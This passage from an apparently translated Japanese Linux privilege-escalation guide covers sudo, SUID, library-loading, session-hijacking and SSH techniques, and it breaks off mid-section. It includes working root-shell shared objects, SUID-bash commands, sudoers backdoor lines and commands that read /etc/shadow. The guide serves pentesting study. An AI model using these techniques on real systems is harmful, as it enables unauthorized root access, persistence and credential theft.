特定の sudo ルールで環境変数が保持される場合、`TF_VAR_<name>` 環境変数を使って Terraform の変数を指定できます。ソース symlink の**読み取り**を利用するには、リンクをたどり、保護された結果を呼び出し元が読み取り可能な宛先にコピーする provider も必要です。宛先 symlink への**書き込み**には別途、呼び出し元が制御できる宛先エントリと、書き込み時にリンクをたどる特権 provider が必要です。後から実行される scheduled job は、起こりうる結果の一例にすぎません。どちらの方法を試す場合も、まず `sudo -l`、`stat`、`readlink` などの読み取り専用コマンドを使って、sudo の許可内容、関連する `.tf` ファイル、選択されている CLI config、パスの所有権を確認してください。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い字句的検証では、symlink は解決されません:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraformはsymlinkを解決し、実際の`/root/root.txt`を攻撃者が読み取り可能な宛先にコピーします。同じ方法で、宛先のsymlinkをあらかじめ作成しておくことで、特権パスへの**書き込み**にも利用できます（例：providerの宛先パスを`/etc/cron.d/`内に向ける）。

### requiretty / !requiretty

一部の古いディストリビューションでは、sudoに`requiretty`を設定し、対話型TTYからのみ実行できるようにしている場合があります。`!requiretty`が設定されている場合（またはこのオプションがない場合）、reverse shells、cron jobs、スクリプトなどの非対話型コンテキストからsudoを実行できます。

```bash
Defaults !requiretty
```

これはそれ自体が直接的な脆弱性ではありませんが、完全な PTY がなくても sudo ルールを悪用できる状況を広げます。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l` に `env_keep+=PATH` が表示される場合、または攻撃者が書き込み可能なエントリ（例: `/home/<user>/bin`）を含む `secure_path` が設定されている場合、sudo で許可された対象内の修飾なしの外部コマンドが別のコマンドでシャドウされる可能性があります。<sup>[[3]](#references)</sup> 有効な `secure_path` が設定されていない場合も、呼び出し元が制御する `PATH` がコマンドの sudo 環境で保持されるなら確認する価値があります。設定がないことだけでは、保持されるとは断定できません。許可されたスクリプトは実行せずに読み取り、そのうえで正確な RunAs と引数のルール、有効なコマンド検索パス、およびコマンド名を含む、より優先順位が高く書き込み可能で、ディレクトリの通過も可能なディレクトリを確認してください。認証、`NOEXEC`、shell builtins、絶対コマンドパスによって結果が変わることがあります。

- 要件: 絶対パスを指定せずにコマンド（`free`、`df`、`ps` など）を呼び出すスクリプト／バイナリを実行する sudo ルール（多くの場合 `NOPASSWD`）と、検索順が最初になる書き込み可能な PATH エントリ。

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo実行時のパス回避
**ジャンプ**して他のファイルを読むか、**シンボリックリンク**を使用します。たとえば、sudoersファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

**wildcard**（\*）が使用されている場合は、さらに簡単です。

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスを指定しない Sudo コマンド/SUID バイナリ

**sudo 権限**が、パスを指定せずに単一のコマンドに付与されている場合: _hacker10 ALL= (root) less_、PATH 変数を変更することで悪用できます。

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

この手法は、**suid** バイナリが **パスを指定せずに別のコマンドを実行する場合にも使用できます（** _**strings**_ **で不審な SUID バイナリの内容を必ず確認してください）**。

[実行するペイロードの例。](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### コマンドのパスを指定する SUID バイナリ

**suid** バイナリが **パスを指定して別のコマンドを実行する場合**は、その suid ファイルが呼び出すコマンド名の**関数を作成して export** してみてください。

たとえば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合は、次のように関数を作成して export します。

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

次に、SUIDバイナリを呼び出すと、この関数が実行されます

### カスタムSUIDコピーラッパー

ソースパスと宛先パスを受け取るroot所有のSUIDユーティリティは、2つの異なる信頼境界をまたぐ可能性があります。いずれかの引数からシェルコマンドを組み立てる場合（たとえば、構築した`cp`コマンドを`system()`に渡す場合）、シェルのメタ文字によって、実効権限で別のコマンドが実行される可能性があります。シェルを介さず安全に`cp`を呼び出す場合でも、宛先に制限がなければ、`/etc/passwd`などのファイルに任意の内容を特権付きで書き込める可能性があります。ラッパーの引数処理、実効UIDの挙動、宛先の制限、コピーされるファイルの内容を呼び出し元が制御できるかどうかを確認してください。一般的な`cp`のエラーやSUIDビットだけでは、どちらの経路も実証されたことにはなりません。手動テストを行う前に、バイナリと権限を受動的に列挙してください。

### SUIDラッパーが実行する書き込み可能なスクリプト

よくあるカスタムアプリの設定ミスは、root所有のSUIDバイナリラッパーがスクリプトを実行する一方で、そのスクリプトが低権限ユーザーから書き込み可能になっているケースです。

典型的なパターン:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

`/usr/local/bin/backup.sh` に書き込み可能であれば、ペイロードコマンドを追記してからSUID wrapperを実行できます:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

簡易チェック:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

この攻撃経路は、`/usr/local/bin` に配置された「メンテナンス」や「バックアップ」用のラッパーで特によく見られます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 環境変数は、ローダーが他のすべてのライブラリ（標準Cライブラリの `libc.so` を含む）より先に読み込む共有ライブラリ（.so ファイル）を1つ以上指定するために使用されます。この処理は、ライブラリのプリロードと呼ばれます。

ただし、システムのセキュリティを維持し、この機能が悪用されるのを防ぐため、特に **suid/sgid** 実行ファイルに対しては、システムによって以下の条件が適用されます。

- 実ユーザー ID (_ruid_) と実効ユーザー ID (_euid_) が一致しない実行ファイルでは、ローダーは **LD_PRELOAD** を無視します。
- suid/sgid が設定された実行ファイルでは、標準パスにある suid/sgid 付きのライブラリのみがプリロードされます。

`sudo` でコマンドを実行でき、`sudo -l` の出力に **env_keep+=LD_PRELOAD** という記述が含まれている場合、権限昇格が可能になることがあります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持されて認識されるため、昇格した権限で任意のコードが実行されるおそれがあります。<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

**/tmp/pe.c** として保存する

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

その後、次の方法で**コンパイルします**：

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

最後に、**escalate privileges** を実行する

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御できる場合も、同様の privesc を悪用できます。攻撃者はライブラリの検索先となるパスを制御できるためです。

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

通常とは異なる **SUID** 権限のバイナリを見つけた場合、**.so** ファイルを適切に読み込んでいるか確認するのがよいでしょう。次のコマンドを実行して確認できます。<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

たとえば、_「open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)」_ のようなエラーに遭遇した場合、悪用できる可能性があります。

これを悪用するには、_「/path/to/.config/libcalc.c」_ などのCファイルを作成し、次のコードを記述します。

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

このコードは、コンパイルして実行すると、ファイル権限を操作し、昇格した権限でシェルを実行することで、権限昇格を狙います。

上記のCファイルを次のコマンドで共有オブジェクト（.so）ファイルにコンパイルします:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

最後に、影響を受ける SUID バイナリを実行すると exploit が発動し、システムが侵害される可能性があります。

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

書き込み可能なフォルダからライブラリを読み込む SUID バイナリが見つかったので、必要な名前でそのフォルダにライブラリを作成しましょう：

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

次のようなエラーが発生した場合:

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

つまり、生成したライブラリには `a_function_name` という関数が必要です。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリをまとめたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のリストですが、コマンドに**引数しか注入できない**場合を対象としています。

このプロジェクトでは、制限付きシェルからの脱出、権限の昇格または維持、ファイルの転送、bind shell や reverse shell の起動、その他の post-exploitation タスクの実行に悪用できる、Unix バイナリの正規の機能を集めています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` を実行できる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、sudo のルールを悪用する方法が見つかるか確認できます。

### Sudo トークンの再利用

**sudo を使える**もののパスワードが分からない場合は、**sudo コマンドが実行されるのを待ってから、セッションのトークンを乗っ取る**ことで権限を昇格できます。<sup>[[18]](#references)</sup>

権限昇格の要件:

- すでにユーザー "_sampleuser_" としてシェルを使える
- "_sampleuser_" が**過去15分以内に `sudo` を使って**何かを実行している（デフォルトでは、この時間が sudo トークンの有効期間です。この間はパスワードを入力せずに `sudo` を使えます）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0
- `gdb` を利用できる（アップロードできる場合も可）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を実行すれば、一時的に `ptrace_scope` を有効にできます。永続的に設定するには、`/etc/sysctl.d/10-ptrace.conf` を変更し、`kernel.yama.ptrace_scope = 0` に設定します）

これらの要件をすべて満たしていれば、次のツールを使って**権限を昇格できます**: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初の exploit**（`exploit.sh`）は、_/tmp_ に `activate_sudo_token` バイナリを作成します。これを使って**自分のセッションで sudo トークンを有効化**できます（自動的に root shell が得られるわけではないため、`sudo su` を実行してください）:

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **2つ目のexploit**（`exploit_v2.sh`）は、_ /tmp_ に **root所有でsetuidが設定された** sh shell を作成します。

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **3つ目の exploit**（`exploit_v3.sh`）は、**sudoers ファイルを作成し、sudo tokens を永続化して、すべてのユーザーが sudo を使えるようにします**。

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

フォルダまたはフォルダ内に作成されたファイルへの**書き込み権限**があれば、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って、ユーザーと PID を指定して sudo token を**作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても、次のようにして **sudo 権限を取得**できます。

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルと `/etc/sudoers.d` 内のファイルでは、誰が `sudo` を使えるか、またその使い方を設定します。これらのファイルは**デフォルトでは、root ユーザーと root グループのみ読み取り可能です**。\
**このファイルを読み取れる**場合、**興味深い情報を入手できる**可能性があります。また、いずれかのファイルに**書き込める**場合、**権限昇格**が可能になります。

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

書き込みができるなら、この権限を悪用できます。

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

これらの権限を悪用する別の方法：

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD向けの`doas`など、`sudo`バイナリの代替手段もあります。`/etc/doas.conf`の設定を確認することを忘れないでください。

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

`doas`でエディタやインタープリターが許可されている場合は、GTFOBins形式のエスケープを確認します。

```bash
doas vim
:!/bin/sh
```

A root権限で実行できる `doas` ルールが、元の Python ベースの `dstat` に対して設定されている場合は、プラグインのパスも確認する価値があります。[manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) と [source](https://github.com/dstat-real/dstat/blob/master/dstat) には、`dstat_*.py` プラグインの配置場所として `/usr/share/dstat/` と `/usr/local/share/dstat/` が記載されています。現在のユーザーが、インストール済みビルドで実際に使われている場所に書き込み・検索できる場合、選択したプラグインが `doas` の RunAs ID で実行される可能性があります。有効なルール、そのビルドでのプラグイン検索先、ディレクトリと親ディレクトリのパーミッションまたは ACL、呼び出し元がプラグインを選択できるかを確認してください。`dstat` ルールや書き込み可能なディレクトリだけでは、あくまで調査の手がかりにすぎません。他の `dstat` 実装では、異なるプラグインシステムが使われることがあります。プラグインを読み込まずに、メタデータを受動的に調査してください。

### Sudo Hijacking

**ユーザーが通常、マシンに接続して `sudo` を使い**権限昇格することが分かっており、そのユーザーのコンテキストでシェルを取得できた場合、root として自分のコードを実行してから、ユーザーのコマンドを実行する新しい sudo 実行ファイルを**作成できます**。その後、ユーザーのコンテキストの **$PATH を変更**します（たとえば、新しいパスを .bash_profile に追加します）。これにより、ユーザーが sudo を実行したときに、自分の sudo 実行ファイルが実行されます。

ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にも別の例があります。

または、次のようなものを実行します。

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## 共有ライブラリ

### ld.so

`/etc/ld.so.conf` ファイルは、**読み込まれる設定ファイルの場所を示します**。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` 内の設定ファイルが読み込まれます。これらの設定ファイルは、**ライブラリの検索先となる他のフォルダーを指定します**。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**つまり、システムは `/usr/local/lib` 内でライブラリを検索します**。

何らかの理由で、ユーザーが `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内のいずれかのファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルに記載されたフォルダーのいずれかに対する**書き込み権限を持っている**場合、権限昇格が可能になることがあります。\
次のページで、**この設定ミスを悪用する方法**を確認してください。


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

`lib`を`/var/tmp/flag15/`にコピーすると、`RPATH`変数で指定されているこの場所にあるライブラリがプログラムによって使用されます。

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

次に、`/var/tmp` に以下のコマンドで悪意のあるライブラリを作成します。 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Capabilities

Linux capabilities は、**利用可能な root 権限の一部をプロセスに付与する**仕組みです。これにより、root の**権限がより小さく独立した単位に分割**されます。これらの各単位は、プロセスに個別に付与できます。この方法では権限全体が縮小され、悪用のリスクが低下します。\
以下のページを読んで、**capabilities とその悪用方法について詳しく学びましょう**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**「execute」ビット**は、対象ユーザーがフォルダーに「**cd**」できることを意味します。\
**「read」**ビットはユーザーが**ファイルを一覧表示**できることを意味し、**「write」**ビットはユーザーが**ファイルを削除**したり、新しい**ファイルを作成**したりできることを意味します。

## ACLs

Access Control Lists (ACLs) は、従来の ugo/rwx 権限を**上書きできる**、任意アクセス制御における第2の権限レイヤーです。これらの権限により、所有者でもグループのメンバーでもない特定のユーザーに権限を付与または拒否できるため、ファイルやディレクトリへのアクセスをより細かく制御できます。この**詳細な制御により、より精密なアクセス管理が可能になります**。詳しくは[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)をご覧ください。<sup>[[19]](#references)</sup>

ユーザー「kali」にファイルの読み取りおよび書き込み権限を**付与**します：

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

システムから特定の ACL を持つファイルを**取得**する:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### sudoers drop-in に隠された ACL backdoor

よくある設定ミスは、`/etc/sudoers.d/` にある root 所有でモード `440` のファイルに、ACL によって low-priv user への書き込み権限が付与されていることです。

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

`user:alice:rw-`のような設定がある場合、制限的なモードビットにもかかわらず、そのユーザーはsudoルールを追加できます。

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

これは、`ls -l` だけの確認では見落としやすいため、影響度の高い ACL による永続化／権限昇格経路です。

## 開いているシェルセッション

ユーザー間の GNU Screen アクセスは、バージョンだけでなく、**実行中のセッションの設定と ACL** に依存します。[GNU Screen のドキュメント](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html)によると、multiuser サポートを有効にしてビルドする必要があります。また、`multiuser on` と `acladd`、または適切な `aclchg` による許可があれば、別のユーザーが接続できます。[マニュアルでは、ユーザー間のセッション検索に setuid-root も必要とされています](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html)。root 所有のソケットが見えることや、SUID の `screen` バイナリが存在することだけでは、接続可能な root シェルがあるとは判断できません。権限昇格とみなす前に、実行中のセッションで multiuser が有効であること、現在のユーザーに実効的な入力／コマンド実行権限があること、そしてそのセッション内のシェルが特権所有者として動作していることを確認してください。

### screen セッションの乗っ取り

**screen セッションを一覧表示する**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessionの乗っ取り - Socketの場所（一部のシステムでは、一方が他方のシンボリックリンクとして公開されています）: ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションに接続する**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

これは**古い tmux バージョン**での問題でした。非特権ユーザーとして、root が作成した tmux (v2.1) セッションを hijack することはできませんでした。

**tmux セッションを一覧表示する**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![ソケットの場所（システムによっては、一方が他方へのシンボリックリンクとして公開される）- tmux sessions hijacking: tmux -S /tmp/dev sess ls そのソケットを使って一覧表示し、そのソケットでtmuxセッションを開始できます...](<../../images/image (837).png>)

**セッションにアタッチする**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

**HTBのValentine box**で例を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

脆弱性が存在した過去の期間に、影響を受ける Debian または派生ディストリビューションの OpenSSL ビルドで生成された鍵は、予測可能な乱数を使用している可能性があります。ホストの現在のディストリビューションや修正済みの OpenSSL バージョンから、古い鍵がどのように生成されたかを判断することはできません。適切な過去のブラックリストと、その鍵の由来を使って**特定の鍵**を確認してください。Debian の [`ssh-vulnkey` マニュアル](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html)には、公開鍵と `authorized_keys` の確認方法が記載されており、[DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1)には OpenSSL の修正が記録されています。特権アカウントの `authorized_keys` にエントリがあっても、対応する秘密鍵を入手でき、かつ実効 SSH ポリシーがそのアカウントでの鍵の使用を引き続き許可している場合に限り、権限昇格の手掛かりとなります。脆弱な**ホスト**鍵は、それ自体ではログイン認証情報になりません。侵害された鍵を交換し、古い鍵の認証設定を削除してください。

### SSHの興味深い設定値

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。OpenSSH 上流版のデフォルトは `yes` ですが、ディストリビューションの設定で上書きされる場合があります。
- **PubkeyAuthentication:** 公開鍵認証を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、空のパスワード文字列を持つアカウントへのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### ログイン制御ファイル

これらのファイルは、ログインできるユーザーやログイン方法に影響します。

- **`/etc/nologin`**: 存在する場合、root 以外のログインをブロックし、メッセージを表示します。
- **`/etc/securetty`**: root がログインできる場所を制限します（TTY の許可リスト）。
- **`/etc/motd`**: ログイン後に表示されるバナーです（環境やメンテナンスの詳細が漏れる可能性があります）。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。OpenSSH 上流版のデフォルトは `prohibit-password` ですが、ディストリビューションの設定で上書きされる場合があります。指定可能な値は次のとおりです。

- `yes`: root はパスワードまたは秘密鍵を使ってログインできます
- `without-password` または `prohibit-password`: root は秘密鍵を使った場合にのみログインできます
- `forced-commands-only`: root は秘密鍵を使い、コマンドオプションが指定されている場合にのみログインできます
- `no` : ログインできません

### 信頼された SSH ユーザー証明書認証局

`TrustedUserCAKeys` は、ユーザー証明書への署名を sshd が信頼する公開鍵を指定します。対応する秘密 CA 鍵を低権限ユーザーが読み取れる場合は、誰が証明書を取得できるか、およびその証明書でどのアカウントの principal として認証できるかを確認してください。`AuthorizedPrincipalsFile` または `AuthorizedPrincipalsCommand` で受け入れる名前を制限できます。どちらも設定されていない場合、証明書には対象アカウント名が含まれている必要があります。`PermitRootLogin prohibit-password` は root のパスワード認証をブロックしますが、証明書認証は引き続き許可される可能性があります。鍵のパスが露出しているだけではアクセス可能だと証明できません。公開鍵と秘密鍵のペア、実効 `Match` ルール、アカウントポリシー、鍵のパスフレーズ、失効状態、許可されている署名アルゴリズムを確認してください。列挙結果に秘密鍵のバイト列を含めないでください。[OpenSSH サーバー設定マニュアル](https://man.openbsd.org/sshd_config#TrustedUserCAKeys)を参照してください。

秘密 CA 鍵は、特権委譲ルールによって、現在のユーザーが鍵所有者の ID で制限のない[証明書署名コマンド（`ssh-keygen -s` など）](https://man.openbsd.org/ssh-keygen#-s)を実行できる場合、鍵を読み取れなくても使用できることがあります。許可されたコマンドと引数を、署名アカウントが鍵にアクセスできるか、実効 sshd 設定で信頼されている公開 CA、対象アカウントで受け入れられる principal、証明書の有効期間、およびそのアカウントのログインポリシーと照合してください。委譲された署名コマンドや信頼された CA ファイルだけでは、別のアカウントにアクセスできることの証明にはなりません。受動的な列挙中にテスト用証明書へ署名しないでください。

アカウントごとに設定される別の CA 信頼経路については、[SSH certificate principal delimiter confusion](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion)を参照してください。

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。ホームディレクトリに置き換えられる `%h` のようなトークンを含めることができます。**絶対パス**（`/` で始まるパス）または**ユーザーのホームディレクトリからの相対パス**を指定できます。たとえば、次のようになります。

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

この設定は、ユーザー「**testusername**」の**秘密**鍵を使ってログインしようとすると、ssh がその鍵の公開鍵を `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと照合することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding を使うと、鍵（パスフレーズなし！）をサーバーに置いたままにせず、ローカルの SSH keys を**使用**できます。そのため、ssh で**ホスト**に**接続**し、そこから**最初のホスト**にある**鍵**を**使って**、さらに**別のホスト**へ**接続**できます。

このオプションを `$HOME/.ssh.config` に次のように設定する必要があります。

```
Host example.com
  ForwardAgent yes
```

`Host` が毎回 `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストが鍵にアクセスできることに注意してください（これはセキュリティ上の問題です）。

`/etc/ssh_config` ファイルでこれらのオプションを**上書き**し、この設定を許可または禁止できます。\
`/etc/sshd_config` ファイルでは、キーワード `AllowAgentForwarding` を使って ssh-agent forwarding を**許可**または禁止できます（デフォルトは許可）。

環境内で Forward Agent が設定されている場合は、以下のページを確認してください。**これを悪用して特権昇格できる可能性があります**。

{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### プロファイルファイル

`/etc/profile` ファイルと `/etc/profile.d/` 以下のファイルは、**ユーザーが新しいシェルを起動したときに実行されるスクリプト**です。したがって、それらのいずれかに**書き込みまたは変更ができれば、特権昇格が可能です**。

```bash
ls -l /etc/profile /etc/profile.d/
```

不審な profile script が見つかった場合は、**機密情報**が含まれていないか確認してください。

### Passwd/Shadow ファイル

OS によっては、`/etc/passwd` ファイルや `/etc/shadow` ファイルの名前が異なる場合や、バックアップが存在する場合があります。そのため、これらのファイルを**すべて見つけ**、ファイルを**読み取れるか確認**して、ファイル内に**hash があるか**確認することをおすすめします。

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

まれに、`/etc/passwd`（または同等のファイル）内に**パスワードハッシュ**が見つかることがあります。

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 書き込み可能な /etc/passwd

まず、以下のいずれかのコマンドでパスワードを生成します。

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

その後、ユーザー `hacker` を追加し、生成されたパスワードを設定します。

```
